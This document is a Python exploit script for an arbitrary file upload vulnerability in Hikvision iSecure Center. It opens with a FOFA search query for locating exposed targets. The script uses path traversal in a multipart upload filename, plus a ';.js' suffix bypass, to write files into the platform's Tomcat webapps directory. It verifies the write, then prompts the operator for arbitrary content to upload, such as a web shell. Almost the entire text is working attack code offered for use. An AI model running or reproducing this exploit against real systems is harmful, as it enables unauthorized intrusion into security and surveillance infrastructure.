#FOFA:app="HIKVISION-iSecure-Center"

import requests
import re
import argparse
import urllib3
from multiprocessing.dummy import Pool
import random
import string

urllib3.disable_warnings()

proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    try:
        flag = '123123123'
        print(flag)
        filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        vuln_url = target + "/center/api/files;.js"
        file = {'file': (f'/../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{filename}.txt', flag,
                         'application/octet-stream')}
        r = requests.post(vuln_url, files=file, timeout=15, verify=False)
        if r.status_code == 200 and "webapps/clusterMgr" in r.text:
            payload = f"/clusterMgr/{filename}.txt;.js"
            url = target + payload
            r2 = requests.get(url, timeout=15, verify=False)
            if r2.status_code == 200 and flag in r2.text:
                print(target + f":存在海康威视isecure center 综合安防管理平台存在任意文件上传漏洞\n文件地址：{url}")
                exp(target)
        else:
            print(target + ":不存在漏洞")
    except:
        print(target + ":不存在漏洞")

def exp(target):
    try:
        user_content = input("请输入要上传的内容：")
        filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        vuln_url = target + "/center/api/files;.js"
        file = {'file': (f'/../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{filename}.txt', user_content,
                         'application/octet-stream')}
        r = requests.post(vuln_url, files=file, timeout=15, verify=False)
        if r.status_code == 200 and "webapps/clusterMgr" in r.text:
            payload = f"/clusterMgr/{filename}.txt;.js"
            url = target + payload
            r2 = requests.get(url, timeout=15, verify=False)
            if r2.status_code == 200 and user_content in r2.text:
                print(target + f":文件上传成功\n文件地址：{url}")
            else:
                print(target + ":文件上传失败或内容不匹配")
        else:
            print(target + ":上传失败")
    except Exception as e:
        print(target + ":操作失败", str(e))


def main():
    parser = argparse.ArgumentParser("HIKVISION iSecure Center综合安防管理平台文件上传漏洞EXP")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()